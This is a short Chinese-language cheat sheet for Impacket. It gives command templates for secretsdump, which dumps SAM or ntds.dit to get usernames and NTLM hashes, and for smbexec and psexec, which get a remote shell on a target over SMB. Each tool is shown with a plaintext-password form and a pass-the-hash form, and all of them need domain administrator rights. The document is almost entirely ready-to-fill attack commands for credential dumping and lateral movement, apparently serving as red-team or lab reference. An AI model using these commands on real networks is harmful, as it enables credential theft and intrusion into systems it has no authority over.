### 将impacket添加到环境变量

```bash
export PATH=/usr/share/doc/python3-impacket/examples:$PATH
```

#### secretsdump

将SAM文件或ntds.dit文件进行转储，得到用户名以及NTLM Hash，需要域管理员权限

```bash
已知明文密码：secretsdump.py [domain name]/[username]:"[password]"@[ip]
已知NTLM Hash：secretsdump.py -hashes [LM Hash:NTLM Hash] [domain name]/[username]@[ip]
```

#### smbexec

利用smb协议获取靶机shell，需要域管理员权限

```bash
已知明文密码：smbexec.py [domain name]/[username]:"[password]"@[ip]
已知NTLM Hash：smbexec.py -hashes [LM Hash:NTLM Hash] [domain name]/[username]@[ip]
```

#### psexec

利用smb协议获取靶机shell，需要域管理员权限

```bash
已知明文密码：psexec.py [domain name]/[username]:"[password]"@[ip]
已知NTLM Hash：psexec.py -hashes [LM Hash:NTLM Hash] [domain name]/[username]@[ip]
```
